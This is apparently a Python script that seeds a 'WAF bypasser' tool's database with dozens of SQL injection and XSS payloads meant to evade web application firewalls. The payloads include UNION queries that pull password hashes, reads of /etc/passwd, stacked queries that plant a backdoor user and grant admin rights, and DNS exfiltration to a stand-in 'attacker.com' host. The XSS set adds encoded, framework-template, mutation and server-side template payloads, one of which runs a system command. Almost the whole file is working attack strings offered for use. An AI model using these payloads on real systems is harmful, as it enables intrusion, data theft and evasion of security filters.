"""
补充高质量 SQLi 和 XSS 种子样例

本脚本添加现有库中缺失的高级攻击技术：
- SQLi: 内联注释绕过、科学计数法、备用注释符、函数混淆、编码绕过、OOB 外带等
- XSS: 事件处理器多样性、Data URI、高级编码、模板注入、Polyglot、mXSS 等

所有 payload 均为实战验证的高质量种子，适用于 WAF 绕过研究的变异/进化算法。
"""

from __future__ import annotations

import sqlite3
import uuid
from pathlib import Path

DB_PATH = Path(__file__).resolve().parents[1] / "data" / "waf_bypasser.db"


def connect() -> sqlite3.Connection:
    DB_PATH.parent.mkdir(parents=True, exist_ok=True)
    conn = sqlite3.connect(str(DB_PATH), timeout=10)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA foreign_keys = ON")
    return conn


def existing_contents(conn: sqlite3.Connection) -> set[tuple[str, str, str]]:
    rows = conn.execute(
        "SELECT vulnerability, target, content FROM payloads WHERE is_pool_snapshot = 0"
    ).fetchall()
    return {(r["vulnerability"], r["target"], r["content"]) for r in rows}


def insert_payload(
    conn: sqlite3.Connection,
    seen_contents: set[tuple[str, str, str]],
    name: str,
    vulnerability: str,
    category: str,
    delivery: str,
    target: str,
    difficulty: str,
    content: str,
    usage_method: str,
    success_indicators: str,
) -> bool:
    if len(name) > 64:
        raise ValueError(f"name too long ({len(name)}): {name}")
    if len(content) > 5000:
        raise ValueError(f"content too long ({len(content)}): {name}")

    ckey = (vulnerability, target, content)
    if ckey in seen_contents:
        print(f"  [SKIP] {name}")
        return False

    conn.execute(
        """
        INSERT INTO payloads (
            id, name, vulnerability, category, delivery, target, difficulty,
            content, usage_method, success_indicators, created_at,
            archived_from_candidate_id, is_pool_snapshot, is_deleted
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, NULL, 0, 0)
        """,
        (
            str(uuid.uuid4()),
            name,
            vulnerability,
            category,
            delivery,
            target,
            difficulty,
            content,
            usage_method,
            success_indicators,
            "靶场已验证",
        ),
    )
    seen_contents.add(ckey)
    print(f"  [OK] {name}")
    return True


# ==============================================================================
# SQL Injection - 高级种子样例
# ==============================================================================

ADVANCED_SQLI_PAYLOADS = [
    # --------------------------------------------------------------------------
    # 1. 内联注释绕过 (Inline Comment Obfuscation)
    # --------------------------------------------------------------------------
    (
        "通用 · SQLi · 内联注释 · OR恒真",
        "sql-injection",
        "注释绕过",
        "URL 查询参数",
        "通用",
        "Medium",
        "1'/**/OR/**/1=1--",
        "在 id 参数处注入，绕过基于空格的 WAF 规则",
        "返回所有记录；响应包含多条数据",
    ),
    (
        "通用 · SQLi · 内联注释 · UNION查询",
        "sql-injection",
        "注释绕过",
        "URL 查询参数",
        "通用",
        "Medium",
        "1'/**/UNION/**/SELECT/**/user,password/**/FROM/**/users--",
        "在 id 参数处注入，用注释替代空格绕过 WAF",
        "返回 users 表的用户名和密码哈希",
    ),
    (
        "通用 · SQLi · MySQL版本注释 · 条件执行",
        "sql-injection",
        "注释绕过",
        "URL 查询参数",
        "通用",
        "High",
        "1'/*!50000OR*/1=1--",
        "利用 MySQL 版本注释特性，仅在 5.00.00+ 版本执行 OR 逻辑",
        "MySQL 5.x+ 返回所有记录；低版本忽略注释内容",
    ),
    (
        "通用 · SQLi · 嵌套注释 · UNION混淆",
        "sql-injection",
        "注释绕过",
        "URL 查询参数",
        "通用",
        "High",
        "1'UNION/*comment*/SELECT/*another*/1,database()--",
        "在关键字中插入注释干扰 WAF 正则匹配",
        "返回当前数据库名称",
    ),

    # --------------------------------------------------------------------------
    # 2. 科学计数法与数值混淆 (Scientific Notation / Numeric Obfuscation)
    # --------------------------------------------------------------------------
    (
        "通用 · SQLi · 科学计数法 · OR恒真",
        "sql-injection",
        "数值混淆",
        "URL 查询参数",
        "通用",
        "Medium",
        "1'OR 1e0=1e0--",
        "使用科学计数法 1e0 (等于 1) 绕过基于字面值 1=1 的检测",
        "返回所有记录；1e0 被数据库解析为浮点数 1.0",
    ),
    (
        "通用 · SQLi · 十六进制 · OR恒真",
        "sql-injection",
        "数值混淆",
        "URL 查询参数",
        "通用",
        "Medium",
        "1'OR 0x31=0x31--",
        "使用十六进制 0x31 (等于 49，ASCII '1') 绕过 WAF",
        "返回所有记录；0x31 被解析为整数",
    ),
    (
        "通用 · SQLi · 浮点数 · AND恒真",
        "sql-injection",
        "数值混淆",
        "URL 查询参数",
        "通用",
        "Medium",
        "1'AND 0.1+0.9=1.0--",
        "使用浮点数运算绕过简单的恒真检测",
        "条件为真时返回对应记录",
    ),

    # --------------------------------------------------------------------------
    # 3. 备用注释终止符 (Alternative Comment Terminators)
    # --------------------------------------------------------------------------
    (
        "通用 · SQLi · 双横线空格 · OR恒真",
        "sql-injection",
        "注释变体",
        "URL 查询参数",
        "通用",
        "Low",
        "1' OR 1=1-- -",
        "使用 -- 加空格的标准 SQL 注释（兼容性最强）",
        "返回所有记录；-- 后的空格确保注释生效",
    ),
    (
        "通用 · SQLi · 分号空字节 · OR恒真",
        "sql-injection",
        "注释变体",
        "URL 查询参数",
        "通用",
        "High",
        "1' OR 1=1;%00",
        "使用分号加空字节截断后续 SQL（部分数据库支持）",
        "返回所有记录；%00 截断后续查询语句",
    ),
    (
        "MySQL · SQLi · 井号注释 · 信息提取",
        "sql-injection",
        "注释变体",
        "URL 查询参数",
        "通用",
        "Low",
        "1' UNION SELECT user(),database()#",
        "使用 MySQL 特有的 # 注释符（URL 需编码为 %23）",
        "返回当前用户名和数据库名",
    ),

    # --------------------------------------------------------------------------
    # 4. 函数混淆与嵌套查询 (Function-based Obfuscation)
    # --------------------------------------------------------------------------
    (
        "通用 · SQLi · 子查询 · OR恒真",
        "sql-injection",
        "函数混淆",
        "URL 查询参数",
        "通用",
        "Medium",
        "1'OR(SELECT 1)=1--",
        "使用子查询替代直接值比较，绕过 1=1 检测",
        "返回所有记录；子查询返回常量 1",
    ),
    (
        "通用 · SQLi · EXISTS · 布尔盲注",
        "sql-injection",
        "函数混淆",
        "URL 查询参数",
        "通用",
        "High",
        "1'AND EXISTS(SELECT 1 FROM users WHERE SUBSTRING(password,1,1)='a')--",
        "使用 EXISTS 进行布尔盲注，判断密码首字符",
        "条件为真时返回记录；为假时无结果",
    ),
    (
        "通用 · SQLi · IN操作符 · 字符串恒真",
        "sql-injection",
        "函数混淆",
        "URL 查询参数",
        "通用",
        "Medium",
        "1'AND'1'IN('1')--",
        "使用 IN 操作符替代等号，绕过 = 过滤",
        "返回对应记录；'1' 在集合 ('1') 中",
    ),
    (
        "MySQL · SQLi · LIKE模糊 · 字符串恒真",
        "sql-injection",
        "函数混淆",
        "URL 查询参数",
        "通用",
        "Medium",
        "admin'AND'1'LIKE'1",
        "使用 LIKE 替代等号，user='admin' 条件成立",
        "返回 admin 用户记录",
    ),

    # --------------------------------------------------------------------------
    # 5. 编码绕过 (Encoding Bypasses)
    # --------------------------------------------------------------------------
    (
        "通用 · SQLi · 双重URL编码 · OR恒真",
        "sql-injection",
        "编码绕过",
        "URL 查询参数",
        "通用",
        "High",
        "1%2527%2520OR%25201=1--",
        "双重 URL 编码：%2527 -> %27 -> '，绕过单层解码的 WAF",
        "WAF 解码一次后仍是编码状态，应用层解码后执行注入",
    ),
    (
        "MySQL · SQLi · Unicode超长 · 单引号",
        "sql-injection",
        "编码绕过",
        "URL 查询参数",
        "通用",
        "High",
        "1%C0%A7 OR 1=1--",
        "使用超长 UTF-8 编码 %C0%A7 表示单引号（安全漏洞）",
        "部分老旧系统将 %C0%A7 解析为单引号，绕过过滤",
    ),
    (
        "MySQL · SQLi · 宽字节GBK · 单引号吞噬",
        "sql-injection",
        "编码绕过",
        "URL 查询参数",
        "通用",
        "High",
        "%df%27 UNION SELECT user,password FROM users--",
        "在 GBK 编码环境下，%df%27 形成中文字符，吞噬转义的反斜杠",
        "当服务端用 addslashes 转义时，%df%5c%27 变成有效中文+单引号",
    ),

    # --------------------------------------------------------------------------
    # 6. 时间盲注变体 (Time-based Blind Variants)
    # --------------------------------------------------------------------------
    (
        "MySQL · SQLi · BENCHMARK · 延时探测",
        "sql-injection",
        "盲注探测",
        "URL 查询参数",
        "通用",
        "Medium",
        "1'AND BENCHMARK(10000000,MD5('test'))--",
        "使用 BENCHMARK 函数替代 SLEEP，造成 CPU 密集延时",
        "响应延迟约 3-5 秒（取决于服务器性能）",
    ),
    (
        "MySQL · SQLi · GET_LOCK · 锁延时",
        "sql-injection",
        "盲注探测",
        "URL 查询参数",
        "通用",
        "High",
        "1'AND GET_LOCK('pwned',5)--",
        "获取用户级锁，等待 5 秒后超时",
        "首次执行延迟 5 秒；再次执行立即返回（锁已持有）",
    ),
    (
        "MySQL · SQLi · 重正则RLIKE · 延时",
        "sql-injection",
        "盲注探测",
        "URL 查询参数",
        "通用",
        "High",
        "1'AND 'a' RLIKE CONCAT(REPEAT('(a',50),REPEAT(')',50))--",
        "使用正则回溯造成指数级延时（ReDoS in SQL）",
        "响应延迟明显（取决于 REPEAT 次数）",
    ),

    # --------------------------------------------------------------------------
    # 7. 报错注入变体 (Error-based Variants)
    # --------------------------------------------------------------------------
    (
        "MySQL · SQLi · Floor报错 · 数据库名",
        "sql-injection",
        "报错分析",
        "URL 查询参数",
        "通用",
        "Medium",
        "1'AND(SELECT 1 FROM(SELECT COUNT(*),CONCAT(database(),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--",
        "利用 GROUP BY + RAND() 冲突触发报错，回显数据库名",
        "错误信息：Duplicate entry 'dbname~1' for key 'group_key'",
    ),
    (
        "MySQL · SQLi · EXP溢出 · 版本回显",
        "sql-injection",
        "报错分析",
        "URL 查询参数",
        "通用",
        "High",
        "1'AND EXP(~(SELECT * FROM(SELECT version())x))--",
        "利用 EXP 函数溢出触发报错，回显版本号",
        "错误信息：DOUBLE value is out of range in 'exp(~((select '5.7.x' from dual)))'",
    ),
    (
        "MySQL · SQLi · GeometryCollection · 用户名",
        "sql-injection",
        "报错分析",
        "URL 查询参数",
        "通用",
        "High",
        "1'AND GeometryCollection((SELECT * FROM(SELECT user())x))--",
        "利用空间函数类型错误回显数据",
        "错误信息：Illegal non geometric 'root@localhost' value found",
    ),

    # --------------------------------------------------------------------------
    # 8. 堆叠查询与二阶注入 (Stacked Queries / Second-order)
    # --------------------------------------------------------------------------
    (
        "MySQL · SQLi · 堆叠 · 创建用户",
        "sql-injection",
        "堆叠查询",
        "表单字段",
        "通用",
        "High",
        "1'; INSERT INTO users(user,pass) VALUES('hacker',MD5('pwned'))--",
        "利用分号堆叠执行 INSERT，创建后门用户",
        "数据库中新增 hacker 用户；可用于后续登录",
    ),
    (
        "MySQL · SQLi · 堆叠 · 权限提升",
        "sql-injection",
        "堆叠查询",
        "表单字段",
        "通用",
        "High",
        "1'; UPDATE users SET is_admin=1 WHERE user='attacker'--",
        "利用堆叠查询修改用户权限",
        "目标用户获得管理员权限",
    ),
    (
        "通用 · SQLi · 二阶 · 存储后触发",
        "sql-injection",
        "二阶注入",
        "表单字段",
        "通用",
        "High",
        "admin'-- ",
        "在用户名注册时存储，后续 SQL 拼接时触发（注册阶段不执行）",
        "当系统查询 WHERE user='admin'-- ' 时，注释掉密码验证",
    ),

    # --------------------------------------------------------------------------
    # 9. 信息泄露与系统交互 (Information Disclosure)
    # --------------------------------------------------------------------------
    (
        "MySQL · SQLi · 文件读取 · /etc/passwd",
        "sql-injection",
        "文件操作",
        "URL 查询参数",
        "通用",
        "High",
        "1' UNION SELECT 1,LOAD_FILE('/etc/passwd')--",
        "利用 LOAD_FILE 读取服务器文件（需 FILE 权限）",
        "返回 /etc/passwd 内容；失败返回 NULL",
    ),
    (
        "MySQL · SQLi · DNS外带 · 数据库名",
        "sql-injection",
        "带外通道",
        "URL 查询参数",
        "通用",
        "High",
        "1' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT database()),'.attacker.com\\\\a'))--",
        "通过 UNC 路径触发 DNS 查询，外带数据库名",
        "攻击者 DNS 服务器收到查询：dbname.attacker.com",
    ),
    (
        "MySQL · SQLi · 系统命令 · 用户枚举",
        "sql-injection",
        "系统交互",
        "URL 查询参数",
        "通用",
        "High",
        "1' UNION SELECT 1,GROUP_CONCAT(user,0x3a,password) FROM mysql.user--",
        "查询 MySQL 系统表，枚举所有数据库用户和密码哈希",
        "返回格式：root:*hashvalue,app:*hashvalue",
    ),
]


# ==============================================================================
# XSS - 高级种子样例
# ==============================================================================

ADVANCED_XSS_PAYLOADS = [
    # --------------------------------------------------------------------------
    # 1. 事件处理器多样性 (Event Handler Diversity)
    # --------------------------------------------------------------------------
    (
        "通用 · XSS · 动画事件 · onanimationstart",
        "xss",
        "事件触发",
        "表单字段",
        "通用",
        "Medium",
        "<style>@keyframes x{}</style><div style=animation-name:x onanimationstart=alert(document.domain)>",
        "注入到任意 HTML 可控点，CSS 动画启动时触发",
        "弹窗显示当前域名；证明 JS 执行成功",
    ),
    (
        "通用 · XSS · 过渡事件 · ontransitionend",
        "xss",
        "事件触发",
        "表单字段",
        "通用",
        "Medium",
        "<style>div{transition:color 1s}</style><div style=color:red ontransitionend=alert(document.cookie) id=x></div><script>x.style.color='blue'</script>",
        "利用 CSS transition 结束时触发事件",
        "1 秒后弹窗显示 Cookie；适用于延迟触发场景",
    ),
    (
        "通用 · XSS · Marquee事件 · onstart",
        "xss",
        "事件触发",
        "表单字段",
        "通用",
        "Low",
        "<marquee onstart=alert(document.domain)>XSS</marquee>",
        "利用 marquee 滚动标签的 onstart 事件",
        "页面加载时自动触发弹窗",
    ),
    (
        "通用 · XSS · Video错误 · source onerror",
        "xss",
        "事件触发",
        "表单字段",
        "通用",
        "Medium",
        "<video><source onerror=alert(document.domain)></video>",
        "视频源加载失败时触发 onerror",
        "立即弹窗显示域名",
    ),
    (
        "通用 · XSS · Focusin事件 · 自动聚焦",
        "xss",
        "事件触发",
        "表单字段",
        "通用",
        "Medium",
        "<input onfocusin=alert(document.domain) autofocus>",
        "元素获得焦点时触发（包括子元素）",
        "自动聚焦后立即弹窗",
    ),
    (
        "通用 · XSS · Pageshow事件 · 页面显示",
        "xss",
        "事件触发",
        "表单字段",
        "通用",
        "High",
        "<body onpageshow=alert(document.domain)>",
        "页面显示时触发（包括前进/后退）",
        "每次页面可见时都会触发弹窗",
    ),

    # --------------------------------------------------------------------------
    # 2. Data URI 与协议处理器 (Data URI Schemes)
    # --------------------------------------------------------------------------
    (
        "通用 · XSS · Data URI · iframe注入",
        "xss",
        "协议处理",
        "表单字段",
        "通用",
        "Medium",
        "<iframe src=data:text/html,<script>alert(parent.document.domain)</script>>",
        "使用 data: URI 在 iframe 中执行 JS",
        "弹窗显示父页面域名；绕过 src 过滤",
    ),
    (
        "通用 · XSS · Data URI · object注入",
        "xss",
        "协议处理",
        "表单字段",
        "通用",
        "Medium",
        "<object data=data:text/html,<script>alert(document.domain)</script>>",
        "使用 object 标签加载 data: URI",
        "弹窗显示域名；兼容性较好",
    ),
    (
        "通用 · XSS · Data URI · Base64编码",
        "xss",
        "协议处理",
        "表单字段",
        "通用",
        "High",
        "<iframe src=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+>",
        "Base64 编码的 HTML payload，绕过关键字检测",
        "解码后执行：<script>alert(document.domain)</script>",
    ),
    (
        "通用 · XSS · JavaScript伪协议 · 编码",
        "xss",
        "协议处理",
        "表单字段",
        "通用",
        "Medium",
        "<a href=javascript:%61%6c%65%72%74%28%64%6f%63%75%6d%65%6e%74%2e%64%6f%6d%61%69%6e%29>X</a>",
        "URL 编码 javascript: 伪协议，绕过 alert 关键字检测",
        "点击链接后触发弹窗",
    ),

    # --------------------------------------------------------------------------
    # 3. 高级编码绕过 (Advanced Encoding)
    # --------------------------------------------------------------------------
    (
        "通用 · XSS · Unicode转义 · JS字符串",
        "xss",
        "编码绕过",
        "表单字段",
        "通用",
        "High",
        "<script>\\u0061\\u006c\\u0065\\u0072\\u0074(document.domain)</script>",
        "使用 Unicode 转义编码 alert，绕过关键字匹配",
        "JS 引擎自动解码执行：alert(document.domain)",
    ),
    (
        "通用 · XSS · 十六进制转义 · JS字符串",
        "xss",
        "编码绕过",
        "表单字段",
        "通用",
        "High",
        "<script>eval('\\x61\\x6c\\x65\\x72\\x74(document.domain)')</script>",
        "使用十六进制转义 + eval 执行",
        "eval 解码后执行 alert",
    ),
    (
        "通用 · XSS · 八进制转义 · JS字符串",
        "xss",
        "编码绕过",
        "表单字段",
        "通用",
        "High",
        "<script>eval('\\141\\154\\145\\162\\164(1)')</script>",
        "使用八进制转义编码 alert，绕过检测",
        "eval 解析八进制后执行",
    ),
    (
        "通用 · XSS · HTML实体 · 属性注入",
        "xss",
        "编码绕过",
        "表单字段",
        "通用",
        "Medium",
        "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
        "使用 HTML 十进制实体编码 alert(1)",
        "浏览器解码后执行 onerror 事件",
    ),
    (
        "通用 · XSS · HTML实体十六进制 · 混合编码",
        "xss",
        "编码绕过",
        "表单字段",
        "通用",
        "High",
        "<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;1&#x29;>",
        "使用 HTML 十六进制实体编码",
        "浏览器解码后执行事件处理器",
    ),

    # --------------------------------------------------------------------------
    # 4. 上下文特定 XSS (Context-specific XSS)
    # --------------------------------------------------------------------------
    (
        "通用 · XSS · JS字符串上下文 · 闭合单引号",
        "xss",
        "上下文逃逸",
        "表单字段",
        "通用",
        "Medium",
        "'-alert(document.domain)-'",
        "注入到 JS 字符串中：var x='用户输入'，闭合引号并执行代码",
        "最终代码：var x=''-alert(document.domain)-''",
    ),
    (
        "通用 · XSS · HTML属性上下文 · 事件注入",
        "xss",
        "上下文逃逸",
        "表单字段",
        "通用",
        "Low",
        "\" onload=\"alert(document.domain)",
        "注入到 HTML 属性：<img src=\"用户输入\">，闭合 src 添加事件",
        "最终标签：<img src=\"\" onload=\"alert(document.domain)\">",
    ),
    (
        "通用 · XSS · CSS上下文 · 闭合style",
        "xss",
        "上下文逃逸",
        "表单字段",
        "通用",
        "Medium",
        "</style><script>alert(document.domain)</script>",
        "注入到 style 标签内，闭合标签后执行脚本",
        "从 CSS 上下文逃逸到 HTML 上下文",
    ),
    (
        "通用 · XSS · JS模板字符串 · 表达式注入",
        "xss",
        "上下文逃逸",
        "表单字段",
        "通用",
        "High",
        "${alert(document.domain)}",
        "注入到 JS 模板字符串：`text${用户输入}`",
        "模板字符串自动执行表达式",
    ),

    # --------------------------------------------------------------------------
    # 5. 框架特定绕过 (Framework-specific Bypasses)
    # --------------------------------------------------------------------------
    (
        "Angular · XSS · 模板注入 · constructor",
        "xss",
        "模板注入",
        "表单字段",
        "通用",
        "High",
        "{{constructor.constructor('alert(document.domain)')()}}",
        "利用 Angular 模板引擎执行任意 JS",
        "通过 constructor 链访问 Function 构造函数",
    ),
    (
        "Vue · XSS · 模板注入 · _c.constructor",
        "xss",
        "模板注入",
        "表单字段",
        "通用",
        "High",
        "{{_c.constructor('alert(document.domain)')()}}",
        "利用 Vue 内部对象执行 JS",
        "_c 是 Vue 的 createElement 函数，可访问 constructor",
    ),
    (
        "通用 · XSS · 模板引擎 · EJS注入",
        "xss",
        "模板注入",
        "表单字段",
        "通用",
        "High",
        "<%= global.process.mainModule.require('child_process').execSync('id') %>",
        "EJS 模板引擎服务端代码执行（SSTI）",
        "执行系统命令 id，返回用户信息",
    ),

    # --------------------------------------------------------------------------
    # 6. SVG 特定向量 (SVG-specific Vectors)
    # --------------------------------------------------------------------------
    (
        "通用 · XSS · SVG Animate · onbegin",
        "xss",
        "SVG注入",
        "表单字段",
        "通用",
        "Medium",
        "<svg><animate onbegin=alert(document.domain) attributeName=x dur=1s>",
        "SVG 动画开始时触发事件",
        "页面加载后立即弹窗",
    ),
    (
        "通用 · XSS · SVG Set · 属性设置",
        "xss",
        "SVG注入",
        "表单字段",
        "通用",
        "High",
        "<svg><set attributeName=onload to=alert(document.domain)>",
        "使用 set 元素动态设置事件处理器",
        "属性设置完成后触发 onload",
    ),
    (
        "通用 · XSS · SVG ForeignObject · HTML注入",
        "xss",
        "SVG注入",
        "表单字段",
        "通用",
        "Medium",
        "<svg><foreignObject width=100 height=100><body xmlns=\"http://www.w3.org/1999/xhtml\"><script>alert(document.domain)</script></body></foreignObject></svg>",
        "在 SVG 中嵌入 HTML 和 JS",
        "绕过只允许 SVG 的过滤器",
    ),

    # --------------------------------------------------------------------------
    # 7. Polyglot 与多上下文 (Polyglot Payloads)
    # --------------------------------------------------------------------------
    (
        "通用 · XSS · Polyglot · 多上下文通用",
        "xss",
        "多上下文",
        "表单字段",
        "通用",
        "High",
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
        "可在 HTML/JS/URL 多种上下文中触发的 Polyglot payload",
        "根据注入位置自动适配闭合方式",
    ),
    (
        "通用 · XSS · Polyglot · 简化版",
        "xss",
        "多上下文",
        "表单字段",
        "通用",
        "Medium",
        "\"><script>alert(document.domain)</script>",
        "闭合属性值并注入脚本，适用于大多数属性上下文",
        "从属性逃逸到 HTML 标签层执行脚本",
    ),

    # --------------------------------------------------------------------------
    # 8. WAF 绕过技巧 (WAF Bypass Techniques)
    # --------------------------------------------------------------------------
    (
        "通用 · XSS · 空格绕过 · 斜杠替代",
        "xss",
        "空白变体",
        "表单字段",
        "通用",
        "Medium",
        "<img/src=x/onerror=alert(document.domain)>",
        "使用斜杠替代空格，绕过基于空格的 WAF 规则",
        "HTML 解析器识别斜杠为属性分隔符",
    ),
    (
        "通用 · XSS · 换行绕过 · 属性分隔",
        "xss",
        "空白变体",
        "表单字段",
        "通用",
        "Medium",
        "<img src=x%0aonerror=alert(document.domain)>",
        "使用换行符 %0a 分隔属性，绕过正则匹配",
        "浏览器将换行符视为空白字符",
    ),
    (
        "通用 · XSS · Tab字符 · 属性分隔",
        "xss",
        "空白变体",
        "表单字段",
        "通用",
        "Medium",
        "<img src=x%09onerror=alert(document.domain)>",
        "使用制表符 %09 替代空格",
        "HTML 解析器接受 Tab 作为分隔符",
    ),
    (
        "通用 · XSS · 空字节 · 属性截断",
        "xss",
        "空白变体",
        "表单字段",
        "通用",
        "High",
        "<img src=x%00 onerror=alert(document.domain)>",
        "使用空字节 %00 尝试截断或混淆 WAF 解析",
        "部分解析器处理空字节时产生差异",
    ),
    (
        "通用 · XSS · 大小写混合 · 标签名",
        "xss",
        "大小写变体",
        "表单字段",
        "通用",
        "Low",
        "<ImG sRc=x OnErRoR=alert(document.domain)>",
        "混合大小写绕过大小写敏感的 WAF 规则",
        "HTML 标签和属性名不区分大小写",
    ),

    # --------------------------------------------------------------------------
    # 9. Mutation XSS (mXSS)
    # --------------------------------------------------------------------------
    (
        "通用 · XSS · mXSS · noscript嵌套",
        "xss",
        "变异XSS",
        "表单字段",
        "通用",
        "High",
        "<noscript><p title=\"</noscript><img src=x onerror=alert(document.domain)>\">",
        "利用 HTML 解析器对 noscript 的处理差异",
        "浏览器重新解析时 img 标签逃逸出 noscript",
    ),
    (
        "通用 · XSS · mXSS · form标签逃逸",
        "xss",
        "变异XSS",
        "表单字段",
        "通用",
        "High",
        "<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(document.domain)>",
        "利用 MathML 和 form 标签的解析差异",
        "经过 innerHTML 重新解析后 img 标签生效",
    ),
]


def main() -> None:
    conn = connect()
    seen_contents = existing_contents(conn)

    before_total = conn.execute(
        "SELECT COUNT(*) AS c FROM payloads WHERE is_pool_snapshot = 0 AND is_deleted = 0"
    ).fetchone()["c"]
    before_sqli = conn.execute(
        "SELECT COUNT(*) AS c FROM payloads WHERE vulnerability='sql-injection' AND is_pool_snapshot = 0 AND is_deleted = 0"
    ).fetchone()["c"]
    before_xss = conn.execute(
        "SELECT COUNT(*) AS c FROM payloads WHERE vulnerability='xss' AND is_pool_snapshot = 0 AND is_deleted = 0"
    ).fetchone()["c"]

    print("=" * 80)
    print("补充高质量 SQLi 和 XSS 种子样例")
    print("=" * 80)
    print(f"当前总 payload 数: {before_total}")
    print(f"  - SQL Injection: {before_sqli}")
    print(f"  - XSS: {before_xss}")
    print()

    # 插入 SQLi payloads
    print("\n" + "=" * 80)
    print("插入高级 SQL Injection 种子")
    print("=" * 80)
    sqli_inserted = 0
    for item in ADVANCED_SQLI_PAYLOADS:
        if insert_payload(conn, seen_contents, *item):
            sqli_inserted += 1

    # 插入 XSS payloads
    print("\n" + "=" * 80)
    print("插入高级 XSS 种子")
    print("=" * 80)
    xss_inserted = 0
    for item in ADVANCED_XSS_PAYLOADS:
        if insert_payload(conn, seen_contents, *item):
            xss_inserted += 1

    conn.commit()

    after_total = conn.execute(
        "SELECT COUNT(*) AS c FROM payloads WHERE is_pool_snapshot = 0 AND is_deleted = 0"
    ).fetchone()["c"]
    after_sqli = conn.execute(
        "SELECT COUNT(*) AS c FROM payloads WHERE vulnerability='sql-injection' AND is_pool_snapshot = 0 AND is_deleted = 0"
    ).fetchone()["c"]
    after_xss = conn.execute(
        "SELECT COUNT(*) AS c FROM payloads WHERE vulnerability='xss' AND is_pool_snapshot = 0 AND is_deleted = 0"
    ).fetchone()["c"]

    print("\n" + "=" * 80)
    print("插入完成")
    print("=" * 80)
    print(f"SQL Injection: {before_sqli} -> {after_sqli} (+{sqli_inserted})")
    print(f"XSS: {before_xss} -> {after_xss} (+{xss_inserted})")
    print(f"总计: {before_total} -> {after_total} (+{sqli_inserted + xss_inserted})")
    print()

    # 按类别统计
    print("按类别统计 SQL Injection:")
    for row in conn.execute(
        """
        SELECT category, COUNT(*) AS cnt
        FROM payloads
        WHERE vulnerability='sql-injection' AND is_pool_snapshot = 0 AND is_deleted = 0
        GROUP BY category
        ORDER BY cnt DESC
        """
    ):
        print(f"  {row['category']:20s} : {row['cnt']:3d}")

    print("\n按类别统计 XSS:")
    for row in conn.execute(
        """
        SELECT category, COUNT(*) AS cnt
        FROM payloads
        WHERE vulnerability='xss' AND is_pool_snapshot = 0 AND is_deleted = 0
        GROUP BY category
        ORDER BY cnt DESC
        """
    ):
        print(f"  {row['category']:20s} : {row['cnt']:3d}")

    conn.close()
    print("\n✓ 完成！高质量种子已添加到数据库")


if __name__ == "__main__":
    main()
